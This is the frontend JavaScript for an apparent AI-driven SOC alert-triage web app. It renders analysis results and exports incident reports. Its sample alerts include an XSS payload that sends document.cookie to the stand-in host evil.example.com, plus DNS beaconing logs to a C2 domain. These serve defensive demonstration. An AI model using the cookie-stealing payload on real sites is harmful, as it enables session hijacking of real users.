/* ============================================================
   AI SOC ANALYST — Frontend JavaScript
   ============================================================ */

'use strict';

// ── Live Clock ──────────────────────────────────────────────
function updateClock() {
    const el = document.getElementById('live-clock');
    if (!el) return;
    const now = new Date();
    el.textContent = now.toUTCString().replace(' GMT', ' UTC');
}
setInterval(updateClock, 1000);
updateClock();

// ── Sample Alerts ───────────────────────────────────────────
const SAMPLE_ALERTS = {
    ssh: `Jan 15 03:42:08 prod-server sshd[8821]: Failed password for root from 203.0.113.47 port 54321 ssh2
Jan 15 03:42:09 prod-server sshd[8821]: Failed password for root from 203.0.113.47 port 54322 ssh2
Jan 15 03:42:10 prod-server sshd[8821]: Failed password for root from 203.0.113.47 port 54323 ssh2
Jan 15 03:42:11 prod-server sshd[8821]: Failed password for admin from 203.0.113.47 port 54324 ssh2
Jan 15 03:42:12 prod-server sshd[8821]: Failed password for admin from 203.0.113.47 port 54325 ssh2
Jan 15 03:42:13 prod-server sshd[8821]: Failed password for ubuntu from 203.0.113.47 port 54326 ssh2
Jan 15 03:42:14 prod-server sshd[8821]: Failed password for ubuntu from 203.0.113.47 port 54327 ssh2
Jan 15 03:42:15 prod-server sshd[8821]: Failed password for pi from 203.0.113.47 port 54328 ssh2
Jan 15 03:42:16 prod-server sshd[8821]: Failed password for pi from 203.0.113.47 port 54329 ssh2
Jan 15 03:42:17 prod-server sshd[8821]: Failed password for test from 203.0.113.47 port 54330 ssh2
Jan 15 03:42:18 prod-server sshd[8821]: error: maximum authentication attempts exceeded for root from 203.0.113.47 port 54331 ssh2 [preauth]
Jan 15 03:42:19 prod-server sshd[8821]: Disconnecting authenticating user root 203.0.113.47 port 54331: Too many authentication failures [preauth]`,

    xss: `[**] [1:2101441:7] ET WEB_SPECIFIC_APPS Possible XSS Attempt via script tag [**]
[Classification: Web Application Attack] [Priority: 1]
03/15-14:22:31.847293 10.0.1.55:49832 -> 192.168.10.20:80
PROTO: TCP
SRC IP: 10.0.1.55  DST IP: 192.168.10.20
SRC PORT: 49832  DST PORT: 80
TTL: 64  TOS: 0x0  ID: 12345
Len: 487

Raw Payload (decoded):
GET /search?q=<script>document.location='http://evil.example.com/steal?c='+document.cookie</script>&category=products HTTP/1.1
Host: intranet.corp.local
User-Agent: Mozilla/5.0 (compatible; attack-tool/1.0)
Accept: text/html
Referer: http://intranet.corp.local/
X-Forwarded-For: 10.0.1.55

[Xref => https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29464]`,

    priv: `Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          1/15/2024 3:44:22 AM
Event ID:      4672
Task Category: Special Logon
Level:         Information
Keywords:      Audit Success
User:          N/A
Computer:      WORKSTATION-07.corp.local
Description:
Special privileges assigned to new logon.

Subject:
  Security ID:     S-1-5-21-3847291840-1234567890-987654321-1107
  Account Name:    jsmith
  Account Domain:  CORP
  Logon ID:        0x4A3F21

Privileges:
  SeSecurityPrivilege
  SeTakeOwnershipPrivilege
  SeLoadDriverPrivilege
  SeBackupPrivilege
  SeRestorePrivilege
  SeDebugPrivilege
  SeSystemEnvironmentPrivilege
  SeEnableDelegationPrivilege
  SeImpersonatePrivilege

Note: jsmith is a standard domain user — no admin group membership on record.
Alert triggered by SIEM correlation rule: NON_ADMIN_SEIMPERSONATEPRIVILEGE`,

    dns: `2024-01-15T08:17:43Z [DNS] query: WORKSTATION-12.corp.local -> 8.8.8.8
  Query: a1b2c3d4.malware-c2.xyz TXT
  Response: 200.150.10.5 TTL:30

2024-01-15T08:18:43Z [DNS] query: WORKSTATION-12.corp.local -> 8.8.8.8
  Query: e5f6a7b8.malware-c2.xyz TXT
  Response: NXDOMAIN TTL:30

2024-01-15T08:19:43Z [DNS] query: WORKSTATION-12.corp.local -> 8.8.8.8
  Query: c9d0e1f2.malware-c2.xyz TXT
  Response: 200.150.10.5 TTL:30

2024-01-15T08:20:43Z [DNS] query: WORKSTATION-12.corp.local -> 8.8.8.8
  Query: 3a4b5c6d.malware-c2.xyz TXT
  Response: 200.150.10.5 TTL:30

[ALERT] SIEM Rule: DNS_BEACONING_PATTERN
  Source Host  : WORKSTATION-12 (10.10.5.44)
  Domain       : *.malware-c2.xyz
  Requests/hr  : 60 (exactly 1/min)
  Pattern      : Regular interval, rotating subdomains, low TTL
  Entropy Score: HIGH (DGA suspected)
  Threat Intel : malware-c2.xyz flagged by VirusTotal (47/72 engines)`
};

function loadSample() {
    const sel = document.getElementById('sample-select');
    const key = sel.value;
    if (!key) return;
    document.getElementById('alert-input').value = SAMPLE_ALERTS[key];
    sel.value = '';
}

function clearInput() {
    document.getElementById('alert-input').value = '';
    hideResults();
    hideError();
}

// ── UI State Helpers ─────────────────────────────────────────
function showLoading() {
    document.getElementById('loading-panel').classList.remove('d-none');
    document.getElementById('results-panel').classList.add('d-none');
    document.getElementById('error-panel').classList.add('d-none');
    document.getElementById('analyze-btn').disabled = true;

    // Animate loading steps
    const steps = ['step-1', 'step-2', 'step-3', 'step-4'];
    steps.forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            el.classList.remove('active', 'done');
        }
    });

    let currentStep = 0;
    const delays = [0, 1500, 3000, 5000];
    window._loadingInterval = steps.map((id, i) =>
        setTimeout(() => {
            if (i > 0) {
                const prev = document.getElementById(steps[i - 1]);
                if (prev) { prev.classList.remove('active'); prev.classList.add('done'); }
            }
            const el = document.getElementById(id);
            if (el) el.classList.add('active');
        }, delays[i])
    );
}

function hideLoading() {
    document.getElementById('loading-panel').classList.add('d-none');
    document.getElementById('analyze-btn').disabled = false;
    if (window._loadingInterval) {
        window._loadingInterval.forEach(clearTimeout);
    }
}

function showResults(analysis) {
    document.getElementById('results-panel').classList.remove('d-none');

    const isTP = analysis.classification === 'True Positive';
    const banner = document.getElementById('classification-banner');
    banner.className = `classification-banner mb-4 ${isTP ? 'tp-banner' : 'fp-banner'}`;

    const icon = document.getElementById('class-icon');
    icon.innerHTML = isTP
        ? '<i class="bi bi-shield-exclamation text-red" style="font-size:2rem"></i>'
        : '<i class="bi bi-shield-check text-green" style="font-size:2rem"></i>';

    const label = document.getElementById('class-label');
    label.textContent = analysis.classification;
    label.className = `classification-label ${isTP ? 'text-red' : 'text-green'}`;

    document.getElementById('class-confidence').textContent = analysis.confidence;

    // Severity badge
    const sev = (analysis.severity || 'Unknown').toLowerCase();
    const sevEl = document.getElementById('severity-badge');
    sevEl.textContent = analysis.severity || 'Unknown';
    sevEl.className = `severity-badge severity-${sev}`;

    // Summary
    document.getElementById('result-summary').textContent = analysis.summary || 'No summary available.';

    // MITRE
    const mitreContainer = document.getElementById('mitre-tags');
    mitreContainer.innerHTML = '';
    if (analysis.mitre_techniques && analysis.mitre_techniques.length > 0) {
        analysis.mitre_techniques.forEach(t => {
            const tag = document.createElement('span');
            tag.className = 'mitre-tag';
            tag.textContent = `${t.id} — ${t.name}`;
            mitreContainer.appendChild(tag);
        });
    } else {
        mitreContainer.innerHTML = '<span class="text-muted small">No MITRE techniques identified.</span>';
    }

    // Containment Steps
    const contList = document.getElementById('containment-list');
    contList.innerHTML = '';
    if (analysis.containment_steps && analysis.containment_steps.length > 0) {
        analysis.containment_steps.forEach(step => {
            const li = document.createElement('li');
            li.textContent = step;
            contList.appendChild(li);
        });
    } else {
        contList.innerHTML = '<li class="text-muted">No containment steps provided.</li>';
    }

    // Incident Report
    document.getElementById('incident-report').textContent =
        analysis.incident_report || 'No incident report generated.';

    // Full report link
    if (analysis.id) {
        const link = document.getElementById('full-report-link');
        if (link) link.href = `/report/${analysis.id}`;
    }

    // Store for export
    window._lastAnalysis = analysis;
}

function hideResults() {
    document.getElementById('results-panel').classList.add('d-none');
}

function showError(message) {
    document.getElementById('error-panel').classList.remove('d-none');
    document.getElementById('error-message').textContent = message;
}

function hideError() {
    document.getElementById('error-panel').classList.add('d-none');
}

// ── Main Analyze Function ────────────────────────────────────
async function analyzeAlert() {
    const alertText = document.getElementById('alert-input').value.trim();

    if (!alertText) {
        showError('Please paste a security alert or log snippet before analyzing.');
        return;
    }

    hideError();
    hideResults();
    showLoading();

    try {
        const response = await fetch('/analyze', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ alert_text: alertText })
        });

        const data = await response.json();
        hideLoading();

        if (!response.ok || data.error) {
            showError(data.error || `Server error (${response.status}). Please try again.`);
            return;
        }

        if (data.success && data.analysis) {
            showResults(data.analysis);
            refreshStats();
            refreshHistory();
        } else {
            showError('Unexpected response from server. Please try again.');
        }

    } catch (err) {
        hideLoading();
        if (err.name === 'TypeError' && err.message.includes('fetch')) {
            showError('Network error. Please check your connection and ensure the server is running.');
        } else {
            showError(`Error: ${err.message}`);
        }
    }
}

// ── Keyboard Shortcut: Ctrl+Enter ───────────────────────────
document.addEventListener('DOMContentLoaded', () => {
    const textarea = document.getElementById('alert-input');
    if (textarea) {
        textarea.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                e.preventDefault();
                analyzeAlert();
            }
        });
    }
});

// ── Export Report ────────────────────────────────────────────
function exportReport() {
    const analysis = window._lastAnalysis;
    if (!analysis) return;

    const alertText = document.getElementById('alert-input').value.trim();
    const incId = analysis.id ? String(analysis.id).padStart(5, '0') : '00000';
    const sep = '='.repeat(60);
    const dash = '-'.repeat(60);

    const mitreTech = (analysis.mitre_techniques || [])
        .map(t => `  • ${t.id} — ${t.name}`)
        .join('\n') || '  None identified';

    const steps = (analysis.containment_steps || [])
        .map((s, i) => `  ${i + 1}. ${s}`)
        .join('\n') || '  None provided';

    const content = `AI SOC ANALYST — INCIDENT REPORT
${sep}
Incident ID   : INC-${incId}
Classification: ${analysis.classification}
Severity      : ${analysis.severity}
Confidence    : ${analysis.confidence}%
Analyzed At   : ${new Date().toUTCString()}
${sep}

RAW ALERT INPUT
${dash}
${alertText}

THREAT SUMMARY
${dash}
${analysis.summary}

MITRE ATT&CK TECHNIQUES
${dash}
${mitreTech}

CONTAINMENT STEPS
${dash}
${steps}

FULL INCIDENT REPORT
${dash}
${analysis.incident_report}

${sep}
Generated by AI SOC Analyst (claude-sonnet-4-6)
For authorized and educational use only.
https://github.com/dhruvshah-cyber/ai-soc-analyst`;

    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `incident-INC-${incId}.txt`;
    a.click();
    URL.revokeObjectURL(url);
}

// ── Refresh Stats after Analysis ─────────────────────────────
async function refreshStats() {
    try {
        const res = await fetch('/api/stats');
        const stats = await res.json();

        setTextSafe('stat-total', stats.total);
        setTextSafe('stat-tp', stats.true_positives);
        setTextSafe('stat-fp', stats.false_positives);
        setTextSafe('stat-critical', stats.severity_breakdown?.Critical ?? 0);

        const total = stats.total || 1;
        const sev = stats.severity_breakdown || {};
        updateBar('sev-critical', sev.Critical || 0, total);
        updateBar('sev-high', sev.High || 0, total);
        updateBar('sev-medium', sev.Medium || 0, total);
        updateBar('sev-low', sev.Low || 0, total);

    } catch (e) {
        console.warn('Failed to refresh stats:', e);
    }
}

function setTextSafe(id, value) {
    const el = document.getElementById(id);
    if (el) el.textContent = value;
}

function updateBar(prefix, count, total) {
    const countEl = document.getElementById(`${prefix}-count`);
    const barEl = document.getElementById(`${prefix}-bar`);
    if (countEl) countEl.textContent = count;
    if (barEl) barEl.style.width = `${Math.round((count / total) * 100)}%`;
}

// ── Refresh History Panel ────────────────────────────────────
async function refreshHistory() {
    try {
        const res = await fetch('/api/alerts');
        const alerts = await res.json();

        const list = document.querySelector('.alert-history-list');
        if (!list) return;

        list.innerHTML = '';
        if (alerts.length === 0) {
            list.innerHTML = `<div class="text-muted small text-center py-4">
                <i class="bi bi-inbox fs-4 d-block mb-2"></i>No alerts analyzed yet.
            </div>`;
            return;
        }

        alerts.forEach(alert => {
            const isTP = alert.classification === 'True Positive';
            const sevClass = `severity-${(alert.severity || 'low').toLowerCase()}`;
            const truncated = alert.alert_text.length > 80
                ? alert.alert_text.substring(0, 80) + '...'
                : alert.alert_text;

            const item = document.createElement('a');
            item.href = `/report/${alert.id}`;
            item.className = 'alert-history-item';
            item.innerHTML = `
                <div class="d-flex align-items-center justify-content-between">
                    <div class="flex-grow-1 me-2 overflow-hidden">
                        <div class="alert-history-text">${escapeHtml(truncated)}</div>
                        <div class="alert-history-meta">
                            <span class="${isTP ? 'text-green' : 'text-red'}">${alert.classification || 'Unknown'}</span>
                            <span class="mx-1 text-muted">·</span>
                            <span class="text-muted">${alert.created_at}</span>
                        </div>
                    </div>
                    <div class="d-flex flex-column align-items-end gap-1">
                        <span class="severity-pill ${sevClass}">${alert.severity || 'N/A'}</span>
                    </div>
                </div>`;
            list.appendChild(item);
        });

        const badge = document.querySelector('.soc-card-header .badge.bg-secondary');
        if (badge && badge.closest('.soc-card')?.querySelector('.alert-history-list')) {
            badge.textContent = alerts.length;
        }

    } catch (e) {
        console.warn('Failed to refresh history:', e);
    }
}

function escapeHtml(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}
